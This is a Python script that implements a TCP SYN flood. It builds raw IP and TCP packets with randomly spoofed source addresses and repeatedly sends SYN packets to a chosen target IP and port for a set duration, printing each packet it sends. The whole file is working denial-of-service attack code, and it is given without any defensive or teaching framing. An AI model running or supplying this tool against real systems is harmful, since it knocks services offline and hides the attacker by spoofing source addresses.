import socket
import random
import threading
import time
import struct

def checksum(data):
    if len(data) % 2 != 0:
        data += b'\0'
    s = sum(struct.unpack("!%dH" % (len(data)//2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return (~s) & 0xffff

def create_ip_header(source_ip, dest_ip):
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 20 + 20  # IP header + TCP header
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(dest_ip)

    ip_ihl_ver = (ip_ver << 4) + ip_ihl

    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ihl_ver,
                            ip_tos,
                            ip_tot_len,
                            ip_id,
                            ip_frag_off,
                            ip_ttl,
                            ip_proto,
                            ip_check,
                            ip_saddr,
                            ip_daddr)

    ip_check = checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ihl_ver,
                            ip_tos,
                            ip_tot_len,
                            ip_id,
                            ip_frag_off,
                            ip_ttl,
                            ip_proto,
                            ip_check,
                            ip_saddr,
                            ip_daddr)
    return ip_header

def create_tcp_header(source_ip, dest_ip, source_port, dest_port):
    tcp_seq = random.randint(0, 4294967295)
    tcp_ack_seq = 0
    tcp_doff = 5    # tcp header size
    tcp_flags = 0x02  # SYN flag
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0

    tcp_offset_res = (tcp_doff << 4) + 0
    tcp_header = struct.pack('!HHLLBBHHH',
                             source_port,
                             dest_port,
                             tcp_seq,
                             tcp_ack_seq,
                             tcp_offset_res,
                             tcp_flags,
                             tcp_window,
                             tcp_check,
                             tcp_urg_ptr)

    # Pseudo header fields for checksum calculation
    source_address = socket.inet_aton(source_ip)
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)

    psh = struct.pack('!4s4sBBH',
                      source_address,
                      dest_address,
                      placeholder,
                      protocol,
                      tcp_length)

    psh = psh + tcp_header

    tcp_check = checksum(psh)

    # Repack TCP header with checksum
    tcp_header = struct.pack('!HHLLBBH',
                             source_port,
                             dest_port,
                             tcp_seq,
                             tcp_ack_seq,
                             tcp_offset_res,
                             tcp_flags,
                             tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)

    return tcp_header

def syn_flood(target_ip, target_port, duration):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        print("[!] Root privileges required to create raw socket.")
        return

    timeout = time.time() + duration

    while time.time() < timeout:
        source_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        source_port = random.randint(1024, 65535)

        ip_header = create_ip_header(source_ip, target_ip)
        tcp_header = create_tcp_header(source_ip, target_ip, source_port, target_port)

        packet = ip_header + tcp_header

        sock.sendto(packet, (target_ip, 0))
        print(f"[SYN] Packet sent from {source_ip}:{source_port} to {target_ip}:{target_port}")
